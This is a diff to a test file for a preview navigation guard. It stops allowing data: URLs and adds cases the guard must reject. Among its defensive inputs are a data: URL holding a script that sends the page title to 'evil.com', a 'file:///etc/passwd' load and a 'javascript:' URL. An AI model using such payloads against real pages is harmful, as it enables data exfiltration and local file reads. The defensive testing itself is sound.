@@ -1,7 +1,7 @@
 import { isAllowedPreviewNavigation } from '../previewNavigationPolicy';
 
 describe('SafeArtifactPreview navigation guard', () => {
-  it.each(['about:blank', 'about:srcdoc', 'data:text/html,<p>hi</p>'])(
+  it.each(['about:blank', 'about:srcdoc'])(
     'allows the in-memory document the component supplied: %s',
     (url) => {
       expect(isAllowedPreviewNavigation(url)).toBe(true);
@@ -16,6 +16,16 @@ describe('SafeArtifactPreview navigation guard', () => {
     'file:///etc/passwd',
     'javascript:alert(1)',
   ])('rejects every remote or local load now that diagrams ship in the app: %s', (url) => {
+    expect(isAllowedPreviewNavigation(url)).toBe(false);
+  });
+
+  it.each([
+    'data:text/html,<script>fetch("https://evil.com/?"+document.title)</script>',
+    'data:text/html;base64,PHA+aGk8L3A+',
+    'DATA:text/html,<p>hi</p>',
+    'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"></svg>',
+    'blob:null/3b1d1e8e-5a4f-4c39-9a52-7f0b4f1f3a10',
+  ])('rejects a document that would leave the preview policy behind: %s', (url) => {
     expect(isAllowedPreviewNavigation(url)).toBe(false);
   });
 });
